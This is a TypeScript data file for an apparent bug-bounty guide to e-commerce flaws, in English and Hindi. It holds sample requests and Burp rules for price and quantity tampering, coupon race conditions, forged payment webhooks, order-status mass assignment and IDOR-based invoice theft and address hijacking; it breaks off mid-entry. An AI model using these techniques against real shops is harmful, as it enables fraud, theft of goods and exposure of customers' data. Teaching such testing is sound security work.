import type { Lang } from "./types";

export interface EcommerceVulnScenario {
  title: Record<Lang, string>;
  description: Record<Lang, string>;
  requestSample?: string;
  responseSample?: string;
  impact: Record<Lang, string>;
}

export interface EcommerceVulnClass {
  id: string;
  title: Record<Lang, string>;
  cwe: string;
  vrt: string;
  bountyRange: string;
  severity: "critical" | "high" | "medium";
  summary: Record<Lang, string>;
  scenarios: EcommerceVulnScenario[];
  testingRecipe: Record<Lang, string>[];
  burpRules: string[];
  hunterProTip: Record<Lang, string>;
}

export interface EcommercePhase {
  phase: number;
  title: Record<Lang, string>;
  objective: Record<Lang, string>;
  steps: Record<Lang, string>[];
  commandsOrPayloads?: string[];
  keyTargets: string[];
}

export interface EcommerceToolSnippet {
  id: string;
  title: Record<Lang, string>;
  description: Record<Lang, string>;
  category: "python_fuzzer" | "turbo_intruder" | "burp_rules";
  code: string;
  language: "python" | "json" | "bash";
  howToUse: Record<Lang, string>;
}

export interface EcommerceReportTemplate {
  id: string;
  title: Record<Lang, string>;
  vulnType: string;
  cvss: string;
  severity: "critical" | "high";
  reportMarkdown: string;
}

// ─── 1. TOP HIGH-YIELD E-COMMERCE VULNERABILITY CLASSES ──────────────────────
export const ECOMMERCE_VULN_CLASSES: EcommerceVulnClass[] = [
  {
    id: "price-quantity-cart-tampering",
    title: {
      en: "Price, Quantity & Cart Parameter Manipulation",
      simple: "Negative Quantities, Free Orders & Decimal Price Tampering",
      hi: "कीमत, क्वांटिटी और कार्ट पैरामीटर में हेरफेर (मुफ्त खरीदारी)",
    },
    cwe: "CWE-602: Client-Side Enforcement of Server-Side Security",
    vrt: "Server-Side Injection › Parameter Tampering › Price / Quantity Manipulation",
    bountyRange: "$2,500 – $10,000 (P1 Critical)",
    severity: "critical",
    summary: {
      en: "E-Commerce backends frequently compute order totals based on parameters submitted directly by the client browser during checkout. By submitting negative quantities (qty=-1), altering unit prices in the POST body, or injecting sub-cent floating-point values, attackers offset expensive purchases down to zero or pay fractions of pennies for flagship electronics.",
      simple: "The shopping cart trusts the numbers your browser sends instead of checking its own catalog. You can set the price of a $1000 laptop to $1 or use negative item numbers to make the total bill $0.",
      hi: "ई-कॉमर्स बैकएंड चेकआउट के समय ब्राउज़र से भेजे गए डेटा पर आंख मूंदकर भरोसा कर लेता है। -1 क्वांटिटी या कीमत बदलकर ₹50,000 के सामान को ₹1 या ₹0 में खरीदा जा सकता है।",
    },
    scenarios: [
      {
        title: {
          en: "Negative Quantity Cart Offset (Paying $0 for High-End Goods)",
          simple: "Using a Negative Item to Cancel Out the Real Item's Price",
          hi: "नेगेटिव क्वांटिटी से कार्ट का कुल बिल जीरो या ₹1 करना",
        },
        description: {
          en: "Attacker adds an expensive product (e.g. $1,200 smartphone, qty=1) and a cheap accessory (e.g. $10 case, qty=-120). The server calculates: (1200 * 1) + (10 * -120) = $0. The gateway accepts $0 or minimum charge $1, creating a paid confirmed order for the smartphone.",
          simple: "Add an expensive phone ($1000) with quantity 1. Then add a $10 cable with quantity -100. $1000 minus $1000 equals $0! The order goes through completely free.",
          hi: "कार्ट में ₹10,000 का फोन (qty: 1) डालें और ₹100 का कवर (qty: -100) जोड़ें। 10,000 - 10,000 = ₹0 हो जाता है और ऑर्डर बिना पैसे दिए कन्फर्म हो जाता है।",
        },
        requestSample: `POST /api/v1/cart/items HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "cart_id": "cart_98a72b",
  "items": [
    {"product_id": "PROD_IPHONE_16", "quantity": 1, "price": 1200.00},
    {"product_id": "PROD_USB_CABLE", "quantity": -119, "price": 10.00}
  ]
}`,
        responseSample: `HTTP/1.1 200 OK
Content-Type: application/json

{"cart_id": "cart_98a72b", "subtotal": 10.00, "discount": 0.00, "final_total": 10.00}`,
        impact: {
          en: "Critical (P1): Direct inventory theft and unrecoverable financial loss.",
          simple: "Attackers can empty the warehouse of expensive electronics for pennies.",
          hi: "लाखों का सामान मुफ्त या मामूली पैसों में आर्डर हो जाता है।",
        },
      },
      {
        title: {
          en: "Direct POST Unit Price Tampering on Checkout",
          simple: "Changing $1,500 to $1 in the Final Payment Request",
          hi: "फाइनल चेकआउट रिक्वेस्ट में प्रोडक्ट की कीमत बदलकर ₹1 करना",
        },
        description: {
          en: "During final order submission at `/api/checkout/pay`, the request body contains individual item prices. Modifying `unit_price: 1500.00` to `unit_price: 0.01` is accepted by the backend because it trusts the checkout payload instead of querying the product database.",
          simple: "Intercept the final 'Pay' button in Burp Suite and change the price from 1500 to 0.01 before the server receives it.",
          hi: "पेमेंट वाले बटन को Burp Suite में पकड़ें और प्रोडक्ट की कीमत 1500 से बदलकर 0.01 कर दें। सर्वर उसी कीमत पर बिल बना देता है।",
        },
        requestSample: `POST /api/v2/orders/checkout HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "product_id": "MACBOOK_PRO_M3",
  "quantity": 1,
  "unit_price": 0.01,
  "currency": "USD"
}`,
        responseSample: `HTTP/1.1 200 OK
Content-Type: application/json

{"order_id": "ORD-55102", "status": "APPROVED", "amount_charged": 0.01}`,
        impact: {
          en: "Critical (P1): Arbitrary price manipulation across the entire store catalogue.",
          simple: "Any user can buy anything on the site for 1 cent.",
          hi: "पूरी वेबसाइट पर किसी भी सामान को 1 पैसे में खरीदने की अनुमति।",
        },
      },
      {
        title: {
          en: "Currency Switching Arbitrage (1:1 Gateway Confusion)",
          simple: "Paying in Cheap Foreign Currency at 1:1 Exchange Rate",
          hi: "करेंसी बदलकर 1:1 के भाव पर भुगतान करना",
        },
        description: {
          en: "Add an item worth $500 USD to cart. At checkout, intercept the request and change the currency code from `USD` to `JPY` or `VND` without recalculating the numeric quantity. The payment gateway charges 500 Japanese Yen (~$3.20 USD) while the order fulfiller ships the $500 product.",
          simple: "The item costs 500 US Dollars. You change the currency label to Japanese Yen. You pay 500 Yen (worth about $3) instead of $500!",
          hi: "सामान $500 डॉलर का है। पेमेंट रिक्वेस्ट में करेंसी को बदल कर JPY (येन) कर दें। आपको सिर्फ 500 येन (लगभग ₹250) चुकाने पड़ेंगे और $500 का सामान मिल जाएगा।",
        },
        requestSample: `POST /api/payment/create-intent HTTP/1.1
Host: target.com
Content-Type: application/json

{"order_id": "ORD-9912", "amount": 500.00, "currency": "JPY"}`,
        responseSample: `HTTP/1.1 200 OK
Content-Type: application/json

{"intent_id": "pi_8819a", "amount_due": 500, "currency": "JPY", "client_secret": "sec_xxx"}`,
        impact: {
          en: "Critical: Massive financial shrinkage on cross-border e-commerce platforms.",
          simple: "Huge financial loss due to currency conversion bugs.",
          hi: "करेंसी मिसमैच से भारी वित्तीय नुकसान।",
        },
      },
    ],
    testingRecipe: [
      {
        en: "Add multiple items to cart and capture the POST /cart/item or PUT /cart/quantity request in Burp Repeater.",
        simple: "Put items in cart and capture the request in Burp.",
        hi: "कार्ट में सामान जोड़ें और Burp Suite में रिक्वेस्ट पकड़ें।",
      },
      {
        en: "Test quantity variations: `quantity: -1`, `quantity: 0`, `quantity: 0.5`, `quantity: \"-1\"`.",
        simple: "Try negative and decimal numbers for the quantity.",
        hi: "क्वांटिटी में -1, 0, 0.5 या स्ट्रिंग डालकर टेस्ट करें।",
      },
      {
        en: "Test price tampering: change `price`, `unit_price`, `total`, `discount_amount` in the checkout body.",
        simple: "Change price numbers in the checkout request to 0.01.",
        hi: "चेकआउट रिक्वेस्ट में कीमत को 0.01 या 0 करके देखें।",
      },
      {
        en: "Verify the order summary and gateway redirection: ensure the modified total carries all the way to payment.",
        simple: "Check if the small price shows up on the payment gateway screen.",
        hi: "देखें कि क्या पेमेंट गेटवे पर वही कम कीमत दिखाई दे रही है।",
      },
    ],
    burpRules: [
      "Burp Match & Replace: Match '\"quantity\":1' -> Replace '\"quantity\":-1'",
      "Burp Match & Replace: Match '\"currency\":\"USD\"' -> Replace '\"currency\":\"JPY\"'",
      "Burp Match & Replace: Match '\"unit_price\":[0-9.]+' -> Replace '\"unit_price\":0.01'",
    ],
    hunterProTip: {
      en: "Always test with 2 items in the cart! Many developers add a validation check `if (quantity < 1)` when adding a product, but forget to validate it on the `UPDATE` or `PATCH /cart/items/{id}` endpoint!",
      simple: "Sites often block negative numbers when adding to cart, but forget to block them when updating the cart later!",
      hi: "बहुत सी साइटें सामान डालते वक्त नेगेटिव नंबर ब्लॉक करती हैं, लेकिन कार्ट में क्वांटिटी अपडेट (प्लस/माइनस) करते वक्त चेक करना भूल जाती हैं!",
    },
  },
  {
    id: "coupon-promo-giftcard-race",
    title: {
      en: "Promo Code, Coupon & Gift Card Exploitation",
      simple: "Single-Packet Coupon Race Conditions & Infinite Stacking",
      hi: "कूपन रेस कंडीशन और अनलिमिटेड डिस्काउंट स्टैकिंग",
    },
    cwe: "CWE-362: Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition')",
    vrt: "Business Logic Flaws › Promotion / Discount Code Abuse › Concurrency",
    bountyRange: "$1,500 – $7,500 (P2 High)",
    severity: "high",
    summary: {
      en: "Promotional discount codes, one-time new user vouchers, and gift cards are designed to be applied strictly once per customer. Due to non-atomic database transactions, sending 20–50 requests in parallel within the same TCP packet (HTTP/2 Single-Packet Attack) allows applying a 50% coupon multiple times, reducing a cart to $0, or redeeming a $50 gift card across multiple accounts simultaneously.",
      simple: "A single-use 50% discount code is supposed to work only once. If you send the coupon request 20 times in the exact same millisecond using Turbo Intruder, the server applies the 50% discount over and over until the cart is 100% free!",
      hi: "एक बार इस्तेमाल होने वाले कूपन को अगर एक ही मिलीसेकंड में 20 बार एक साथ भेजा जाए, तो सर्वर बार-बार डिस्काउंट जोड़ देता है और 100% फ्री शॉपिंग हो जाती है।",
    },
    scenarios: [
      {
        title: {
          en: "Single-Use 50% Off Coupon Multi-Applied via HTTP/2 Race",
          simple: "Stacking a 50% Coupon Multiple Times in One Millisecond",
          hi: "सिंगल-पैकेट रेस कंडीशन से 50% कूपन को कई बार लगाना",
        },
        description: {
          en: "A coupon `SAVE50` gives 50% off for first-time buyers. Using Turbo Intruder or Burp Repeater Tab Group Parallel Send, 30 coupon redemption requests hit the server concurrently. Because the backend reads `coupon.is_used` before any thread commits `coupon.is_used = true`, the discount applies 4 times: $400 -> $200 -> $100 -> $50 -> $25.",
          simple: "Send the coupon request 30 times at once. All of them succeed before the database can mark the coupon as 'Already Used'.",
          hi: "कूपन अप्लाई करने की 30 रिक्वेस्ट एक साथ भेजें। डेटाबेस में 'used' मार्क होने से पहले कई बार डिस्काउंट लग जाता है।",
        },
        requestSample: `POST /api/v1/cart/apply-coupon HTTP/2
Host: target.com
Content-Type: application/json

{"cart_id": "c_8819", "coupon_code": "FIRST50"}`,
        responseSample: `HTTP/2 200 OK
Content-Type: application/json

{"discount_applied": 150.00, "remaining_total": 0.00}`,
        impact: {
          en: "High (P2): Unlimited free or deeply discounted purchases across the store.",
          simple: "Allows free purchases by multiplying limited discount codes.",
          hi: "डिस्काउंट कूपन को बार-बार लगाकर मुफ्त में खरीदारी।",
        },
      },
      {
        title: {
          en: "Gift Card Double-Redemption on Separate Sessions",
          simple: "Redeeming the Same $100 Gift Card on Two Tabs Simultaneously",
          hi: "एक ही ₹1000 के गिफ्ट कार्ड को दो अलग-अलग टैब में एक साथ भुनाना",
        },
        description: {
          en: "An attacker has a valid $100 gift card code. Opening two parallel browser sessions (or sending synchronized API calls), the attacker applies the gift card to two separate carts worth $100 each. Both checkouts succeed because the balance deduction query is not guarded by pessimistic row-level locking.",
          simple: "Use the same gift card in two browser windows and hit submit at the exact same instant. Both orders get approved for $100!",
          hi: "दो अलग ब्राउज़र विंडो में एक ही गिफ्ट कार्ड डालें और दोनों पर एक साथ क्लिक करें। दोनों को ₹1000 का फायदा मिल जाता है।",
        },
        requestSample: `POST /api/gift-cards/redeem HTTP/1.1
Host: target.com
Content-Type: application/json

{"card_pin": "GIFT-9912-A81B", "order_id": "ORD-112"}`,
        responseSample: `HTTP/1.1 200 OK
Content-Type: application/json

{"status": "APPLIED", "balance_deducted": 100.00, "remaining_balance": 0.00}`,
        impact: {
          en: "Critical/High: Doubling or multiplying digital cash balance through race conditions.",
          simple: "Free money generated from digital gift vouchers.",
          hi: "गिफ्ट कार्ड बैलेंस को दोगुना करना।",
        },
      },
      {
        title: {
          en: "Coupon Stacking via Multi-Tab Application",
          simple: "Applying Two Different Coupons That Were Not Supposed to Combine",
          hi: "मनाही के बावजूद दो अलग-अलग कूपन एक साथ लगा लेना",
        },
        description: {
          en: "Terms specify that 'Flat $20 Off' cannot be combined with '30% Off Clearance'. By applying Coupon A on Tab 1, then sending Coupon B without refreshing Tab 1, the session state retains both discount vouchers.",
          simple: "Combine multiple coupon codes that the site explicitly bans from being used together.",
          hi: "उन कूपन्स को भी एक साथ लागू कर लेना जिन्हें साइट एक साथ लगाने से रोकती है।",
        },
        requestSample: `POST /api/cart/coupons HTTP/1.1
Host: target.com
Content-Type: application/json

{"code": "FLAT20", "override_existing": false}`,
        responseSample: `HTTP/1.1 200 OK
Content-Type: application/json

{"active_coupons": ["CLEARANCE30", "FLAT20"], "total_discount": 70.00}`,
        impact: {
          en: "High (P2): Breaking business rules to stack unauthorized discounts.",
          simple: "Illegal stacking of multiple discounts.",
          hi: "अनधिकृत रूप से कई डिस्काउंट जोड़ना।",
        },
      },
    ],
    testingRecipe: [
      {
        en: "Obtain a single-use coupon code (e.g. newsletter signup 10% off or welcome voucher).",
        simple: "Get a 1-time discount code.",
        hi: "एक बार इस्तेमाल होने वाला कूपन कोड लें।",
      },
      {
        en: "Capture the apply coupon request in Burp Suite and send to Turbo Intruder.",
        simple: "Capture the coupon apply request and send to Turbo Intruder.",
        hi: "Burp में कूपन अप्लाई रिक्वेस्ट को Turbo Intruder में भेजें।",
      },
      {
        en: "Use `engine.openGate('race')` with 20-30 requests to release them all in parallel.",
        simple: "Send 20 requests in parallel at the same millisecond.",
        hi: "सिंगल-पैकेट रेस कंडीशन से 20-30 रिक्वेस्ट एक साथ फायर करें।",
      },
      {
        en: "Check if the cart discount multiplies or if multiple 200 OK responses are received.",
        simple: "Check if the discount applied multiple times.",
        hi: "देखें कि क्या डिस्काउंट कई बार लग गया।",
      },
    ],
    burpRules: [
      "Turbo Intruder: engine=Engine.BURP2, concurrentConnections=1, requestsPerConnection=100",
      "Repeater: Group 20 coupon requests into a Tab Group -> Send group in parallel",
    ],
    hunterProTip: {
      en: "Also test referral codes! Many e-commerce apps give $10 for every friend referred. Test referring your own secondary account, or test concurrent referral redemption to get $100 store credit in seconds!",
      simple: "Try the race condition on referral codes to claim referral bonuses 10 times!",
      hi: "रेफरल कोड पर भी रेस कंडीशन टेस्ट करें। कई साइटें एक ही रेफरल पर 10 बार बोनस दे देती हैं!",
    },
  },
  {
    id: "payment-webhook-gateway-bypass",
    title: {
      en: "Payment Gateway Callback & Webhook Verification Bypass",
      simple: "Faking Successful Payments via Missing HMAC Signatures",
      hi: "पेमेंट गेटवे वेबहुक और कॉलबैक बाईपास (फर्जी पेमेंट)",
    },
    cwe: "CWE-347: Improper Verification of Cryptographic Signature",
    vrt: "Server-Side Injection › Parameter Tampering › Payment Status Bypass",
    bountyRange: "$5,000 – $20,000 (P1 Critical)",
    severity: "critical",
    summary: {
      en: "When an external gateway (Stripe, Razorpay, PayPal, Adyen) processes a payment, it notifies the merchant backend via an asynchronous webhook or HTTP POST callback. If the merchant backend fails to verify the cryptographic HMAC signature (`Stripe-Signature`, `X-Razorpay-Signature`), an attacker can craft a fake webhook payload directly to the server, confirming any order without spending a single rupee or dollar.",
      simple: "When you pay with Stripe or PayPal, the bank sends a secret signed message to the store saying 'He paid!'. If the store forgets to check the bank's secret stamp, you can send that message yourself and the store ships your order for free!",
      hi: "पेमेंट गेटवे पेमेंट सफल होने पर सर्वर को एक सीक्रेट डिजिटल सिग्नेचर वाला मैसेज भेजता है। अगर सर्वर उस सिग्नेचर को जांचना भूल जाए, तो हम खुद फर्जी मैसेज भेजकर ऑर्डर को 'PAID' करवा सकते हैं।",
    },
    scenarios: [
      {
        title: {
          en: "Forged Webhook Event Without Valid HMAC Secret",
          simple: "Sending a Fake 'Payment Completed' Webhook to the Server",
          hi: "बिना सीक्रेट की के फर्जी 'Payment Completed' वेबहुक भेजना",
        },
        description: {
          en: "Attacker places an order, receiving `order_id: ORD-10928`. Instead of completing payment at the gateway, the attacker sends a POST request directly to `https://target.com/api/webhooks/stripe` containing `{\"type\": \"payment_intent.succeeded\", \"data\": {\"object\": {\"metadata\": {\"order_id\": \"ORD-10928\"}}}}`. Because the backend lacks signature validation, the order status changes to `PAID`.",
          simple: "Send a direct message to the store's webhook endpoint saying your order was paid. If it accepts it without the secret key, the order is fulfilled.",
          hi: "स्टोर के वेबहुक URL पर सीधे POST रिक्वेस्ट भेजकर अपने ऑर्डर को 'PAID' करवाएं। बिना बैंक सिग्नेचर के ऑर्डर कन्फर्म हो जाता है।",
        },
        requestSample: `POST /api/webhooks/payment-gateway HTTP/1.1
Host: target.com
Content-Type: application/json
X-Gateway-Signature: fake_or_omitted

{
  "event": "charge.successful",
  "order_id": "ORD-10928",
  "amount": 999.00,
  "currency": "USD",
  "status": "PAID"
}`,
        responseSample: `HTTP/1.1 200 OK
Content-Type: application/json

{"success": true, "order_status": "PROCESSING_FOR_SHIPPING"}`,
        impact: {
          en: "Critical (P1): Complete financial compromise; zero-cost fulfillment of high-value goods.",
          simple: "Can order infinite physical merchandise for free.",
          hi: "लाखों के सामान की फर्जी पेमेंट बनाकर फ्री डिलीवरी।",
        },
      },
      {
        title: {
          en: "Client-Side Return URL Status Manipulation",
          simple: "Changing 'cancelled' to 'success' in the Browser Redirect URL",
          hi: "ब्राउज़र के रीडायरेक्ट URL में 'cancelled' को 'success' बनाना",
        },
        description: {
          en: "On 3D Secure / OTP cancellation at the banking page, the gateway redirects back to `https://target.com/checkout/callback?status=failed&token=tx_991`. Changing the parameter to `?status=success` or `?payment_status=paid` tricks frontend single-page routers into triggering the backend order fulfillment API.",
          simple: "When the payment fails, change 'failed' to 'success' in your browser address bar. The frontend thinks you paid!",
          hi: "पेमेंट कैंसिल करने पर URL में जब 'status=failed' आए, तो उसे 'status=success' कर दें।",
        },
        requestSample: `GET /checkout/callback?status=success&tx_id=tx_demo_test&order_id=ORD-9912 HTTP/1.1
Host: target.com
Cookie: session_id=sess_attacker_1`,
        responseSample: `HTTP/1.1 200 OK
Content-Type: application/json

{"message": "Payment verified via redirect. Order placed successfully!"}`,
        impact: {
          en: "Critical (P1): Authentication and payment state determined purely client-side.",
          simple: "Orders placed without real bank authorization.",
          hi: "बिना बैंक अप्रूवल के ऑर्डर प्लेस होना।",
        },
      },
      {
        title: {
          en: "Order Status Modification IDOR via PUT/PATCH",
          simple: "Directly Updating Your Order from 'PENDING' to 'PAID'",
          hi: "API में स्टेटस को खुद ही 'PENDING' से 'PAID' में बदल देना",
        },
        description: {
          en: "The mobile app uses `PATCH /api/v1/orders/{id}` to update delivery instructions. By adding `\"payment_status\": \"PAID\"` or `\"status\": \"SHIPPED\"` into the JSON payload (Mass Assignment / Parameter Tampering), the backend sets the order to fully paid.",
          simple: "When editing your delivery notes, slip in 'status: PAID' into the request. The server accepts it!",
          hi: "डिलीवरी नोट एडिट करते वक्त रिक्वेस्ट में 'payment_status: PAID' जोड़ दें। सर्वर उसे सेव कर लेता है।",
        },
        requestSample: `PATCH /api/v1/orders/ORD-8819 HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "notes": "Please leave at door",
  "payment_status": "PAID",
  "is_paid": true
}`,
        responseSample: `HTTP/1.1 200 OK
Content-Type: application/json

{"order_id": "ORD-8819", "payment_status": "PAID", "is_paid": true}`,
        impact: {
          en: "Critical (P1): Mass Assignment leading to free purchases.",
          simple: "Self-marking orders as paid.",
          hi: "खुद ही ऑर्डर को पेड मार्क कर लेना।",
        },
      },
    ],
    testingRecipe: [
      {
        en: "Identify payment webhook endpoints by monitoring network traffic or checking robots.txt/JS bundles for `/webhook`, `/callback`, `/ipn`.",
        simple: "Find the webhook link in JS files or traffic.",
        hi: "वेबसाइट के JS कोड या नेटवर्क ट्रैफिक में वेबहुक लिंक ढूंढें।",
      },
      {
        en: "Send a POST request to the webhook URL without any signature headers.",
        simple: "Send a fake payment success message to the webhook without signatures.",
        hi: "बिना किसी सिग्नेचर हेडर के वेबहुक पर फर्जी पेमेंट सफल की रिक्वेस्ट भेजें।",
      },
      {
        en: "Send with a tampered or invalid signature: check if the backend rejects with 401/403 or blindly returns 200 OK.",
        simple: "See if the server rejects fake messages or happily accepts them.",
        hi: "देखें कि क्या सर्वर फर्जी सिग्नेचर को रिजेक्ट करता है या 200 OK दे देता है।",
      },
      {
        en: "Test gateway cancellation flows: intercept the failure redirect and flip parameters to success.",
        simple: "Cancel the payment and change failure to success in the redirect URL.",
        hi: "पेमेंट कैंसिल करके रीडायरेक्ट URL में failed को success बनाकर देखें।",
      },
    ],
    burpRules: [
      "Burp Match & Replace: Match 'status=failed' -> Replace 'status=success'",
      "Burp Match & Replace: Match 'payment_status=CANCELLED' -> Replace 'payment_status=COMPLETED'",
    ],
    hunterProTip: {
      en: "Look for test-mode credentials left in production! Check JavaScript bundles for public Stripe test keys (`pk_test_...`) or Razorpay test keys (`rzp_test_...`). If the backend also accepts test payments in production, you can complete orders using standard test cards (`4242 4242 4242 4242`)!",
      simple: "Search the frontend JS files for 'pk_test_' or 'rzp_test_'. If test keys are enabled in production, you can buy real goods using fake test credit cards!",
      hi: "फ्रंट-एंड JS फाइल्स में 'pk_test_' ढूंढें। अगर लाइव साइट पर टेस्ट मोड एक्टिव है, तो डमी क्रेडिट कार्ड (4242...) से असली सामान खरीदा जा सकता है!",
    },
  },
  {
    id: "inventory-locking-cart-dos",
    title: {
      en: "Inventory Locking & Cart Reservation Denial of Service",
      simple: "Holding Limited Stock Hostage Without Purchasing",
      hi: "इन्वेंट्री लॉकिंग और स्टॉक डिनायल ऑफ सर्विस",
    },
    cwe: "CWE-400: Uncontrolled Resource Consumption",
    vrt: "Denial of Service › Resource Exhaustion › Business Logic",
    bountyRange: "$1,000 – $5,000 (P3 Medium / P2 High)",
    severity: "medium",
    summary: {
      en: "Many e-commerce systems reserve physical inventory in a user's cart or pending checkout for 15–60 minutes to prevent overselling during flash sales. If the reservation endpoint lacks rate limiting and cart capacity validation, an attacker can hold the entire warehouse inventory hostage across multiple automated carts, denying sales to all genuine customers during critical product launches.",
      simple: "When you add an item to cart, the store saves it for you for 30 minutes. If an attacker puts all 5,000 sneakers into carts without paying, nobody else in the world can buy them during the flash sale!",
      hi: "फ्लैश सेल के दौरान सामान कार्ट में डालते ही 30 मिनट के लिए लॉक हो जाता है। अटैकर बॉट्स के जरिए सारा स्टॉक कार्ट में होल्ड कर लेता है, जिससे असली ग्राहक सामान नहीं खरीद पाते।",
    },
    scenarios: [
      {
        title: {
          en: "Flash Sale Inventory Depletion via Automated Pending Carts",
          simple: "Locking All Limited Stock into Unpaid Pending Carts",
          hi: "सारे स्टॉक को अनपेड कार्ट्स में डालकर ब्लॉक करना",
        },
        description: {
          en: "A merchant launches 1,000 limited edition items. An attacker runs a script creating 100 carts with 10 units each. The store marks the product as 'Out of Stock' for all other buyers. The attacker can cancel or repeat this reservation indefinitely without spending money.",
          simple: "Create 100 carts and reserve 10 items in each. The site displays 'Sold Out' to real buyers.",
          hi: "100 कार्ट्स बनाकर सभी में 10-10 पीस बुक कर लें। असली ग्राहकों को साइट 'Sold Out' दिखाने लगेगी।",
        },
        requestSample: `POST /api/v1/checkout/reserve-stock HTTP/1.1
Host: target.com
Content-Type: application/json

{"sku": "LIMITED-EDITION-DROP", "quantity": 100, "reservation_minutes": 30}`,
        responseSample: `HTTP/1.1 200 OK
Content-Type: application/json

{"status": "RESERVED", "expires_at": "2026-10-24T15:00:00Z", "remaining_stock": 0}`,
        impact: {
          en: "Medium/High: Severe financial and brand reputation damage during peak sales events.",
          simple: "Stops all sales during major shopping events.",
          hi: "सेल के दौरान दुकान की सारी बिक्री ठप हो जाना।",
        },
      },
    ],
    testingRecipe: [
      {
        en: "Add an item to cart and observe if the product page's stock count decreases immediately.",
        simple: "Check if adding an item to cart immediately reduces the stock count.",
        hi: "देखें कि कार्ट में सामान डालते ही क्या स्टॉक कम हो रहा है।",
      },
      {
        en: "Test creating multiple carts from different sessions or IP addresses to lock large quantities.",
        simple: "Try reserving large quantities across multiple accounts.",
        hi: "अलग-अलग अकाउंट्स से सारा सामान कार्ट में बुक करके देखें।",
      },
      {
        en: "Verify if the reservation expires properly or if it can be refreshed indefinitely via heartbeat API.",
        simple: "Check if the reservation timer can be extended forever.",
        hi: "जांचें कि क्या टाइमर खत्म होने के बाद स्टॉक वापस आ जाता है या अनिश्चितकाल तक लॉक रहता है।",
      },
    ],
    burpRules: [
      "Burp Intruder: Repeat stock reservation request 100 times",
    ],
    hunterProTip: {
      en: "Check integer overflow in stock orders! Try ordering `quantity: 2147483648` (2^31) or `quantity: 4294967296` (2^32). In vulnerable 32-bit systems, this wraps around to 0 or 1, allowing you to bypass stock limits!",
      simple: "Try huge numbers like 2147483648 for the quantity. It might trick the database into thinking you ordered 0 items!",
      hi: "क्वांटिटी में बहुत बड़ा नंबर (जैसे 2147483648) डालकर देखें। कई बार कंप्यूटर की मेमोरी ओवरफ्लो होकर स्टॉक लिमिट बाईपास हो जाती है!",
    },
  },
  {
    id: "order-invoice-address-idor",
    title: {
      en: "Order IDOR, PII Leakage & In-Flight Address Hijacking",
      simple: "Viewing Anyone's Invoices and Rerouting Paid Shipments",
      hi: "ऑर्डर IDOR, इनवॉइस लीक और शिपिंग एड्रेस हाईजैकिंग",
    },
    cwe: "CWE-639: Authorization Bypass Through User-Controlled Key",
    vrt: "Broken Access Control (BAC) › Insecure Direct Object Reference (IDOR)",
    bountyRange: "$2,000 – $8,000 (P2 High / P1 Critical)",
    severity: "high",
    summary: {
      en: "Order IDs are often sequential numbers (e.g. `/api/orders/10042`) or predictable hashes. When authorization checks are missing, attackers can view customer receipts containing full names, physical addresses, phone numbers, and payment details. Furthermore, modifying the shipping address on in-flight orders allows redirecting paid merchandise directly to the attacker's home.",
      simple: "By changing the order number in the web address from 10042 to 10043, you can see other people's invoices, phone numbers, and home addresses. You can even change their shipping address to your house so their package delivers to you!",
      hi: "URL में अपना आर्डर नंबर बदलकर किसी और का नंबर डालने पर उसका नाम, पता, फोन नंबर और इनवॉइस डाउनलोड हो जाता है। यहाँ तक कि उसका सामान अपने घर मंगवाया जा सकता है।",
    },
    scenarios: [
      {
        title: {
          en: "Invoice PDF Download IDOR Exposing Full Customer PII",
          simple: "Downloading Invoices of Any Customer by Changing Order ID",
          hi: "ऑर्डर ID बदलकर किसी भी ग्राहक का इनवॉइस डाउनलोड करना",
        },
        description: {
          en: "Navigating to `/api/v1/orders/10492/invoice.pdf` downloads the receipt. Changing the ID to `10491` downloads another customer's invoice containing billing address, phone number, and masked card details without session validation.",
          simple: "Change the number in the PDF invoice link to download stranger's bills.",
          hi: "PDF लिंक में नंबर बदलें और दूसरे ग्राहकों के बिल और निजी जानकारी डाउनलोड करें।",
        },
        requestSample: `GET /api/v1/orders/10491/invoice.pdf HTTP/1.1
Host: target.com
Cookie: session_user_attacker`,
        responseSample: `HTTP/1.1 200 OK
Content-Type: application/pdf
Content-Disposition: attachment; filename="invoice_10491.pdf"`,
        impact: {
          en: "High (P2): Mass PII breach violating GDPR and privacy laws.",
          simple: "Mass privacy leak of customer addresses and purchases.",
          hi: "हजारों ग्राहकों के पते और फोन नंबर का सार्वजनिक लीक।",
        },
      },
      {
        title: {
          en: "In-Flight Shipping Address Hijacking (Physical Rerouting)",
          simple: "Changing Someone Else's Delivery Address to Your House",
          hi: "किसी दूसरे के ऑर्डर का डिलीवरी एड्रेस बदलकर अपने घर मंगवाना",
        },
        description: {
          en: "Target provides an API to update shipping address for orders awaiting dispatch (`PUT /api/orders/{id}/shipping-address`). An attacker increments the order ID and updates the delivery address to their own address, stealing the physical goods once dispatched.",
          simple: "Update the delivery address of another user's paid order so the delivery driver brings it to you.",
          hi: "दूसरे यूजर के आर्डर में अपना पता डाल दें, डिलीवरी बॉय सामान आपके घर छोड़ जाएगा।",
        },
        requestSample: `PUT /api/orders/99214/shipping-address HTTP/1.1
Host: target.com
Content-Type: application/json
Cookie: session_attacker

{
  "street": "123 Attacker Lane",
  "city": "Hacker City",
  "zip": "90210"
}`,
        responseSample: `HTTP/1.1 200 OK
Content-Type: application/json

{"status": "UPDATED", "destination": "123 Attacker Lane"}`,
        impact: {
          en: "Critical (P1): Physical package theft and account manipulation.",
          simple: "Direct theft of physical shipments.",
          hi: "असली सामान की सीधी चोरी।",
        },
      },
    ],
    testingRecipe: [
      {
        en: "Create two test accounts: Account A and Account B. Place an order on both.",
        simple: "Create 2 accounts and place a small order on each.",
        hi: "दो टेस्ट अकाउंट बनाएं और दोनों पर एक-एक आर्डर प्लेस करें।",
      },
      {
        en: "Capture the order details, invoice download, and tracking requests for Account A.",
        simple: "Capture the invoice and tracking requests for Account A.",
        hi: "अकाउंट A की इनवॉइस और ट्रैकिंग रिक्वेस्ट कैप्चर करें।",
      },
      {
        en: "Replace Account A's order ID with Account B's order ID while keeping Account A's session cookies.",
        simple: "Put Account B's order number into Account A's request.",
        hi: "अकाउंट A की कुकीज के साथ अकाउंट B का आर्डर नंबर डालकर देखें।",
      },
      {
        en: "Test modifying the delivery address and cancellation status via PUT/PATCH/DELETE endpoints.",
        simple: "Try changing delivery address on Account B's order.",
        hi: "देखें कि क्या अकाउंट B का डिलीवरी एड्रेस बदला जा सकता है।",
      },
    ],
    burpRules: [
      "Burp Autorize: Configure for automated E-Commerce order IDOR detection",
    ],
    hunterProTip: {
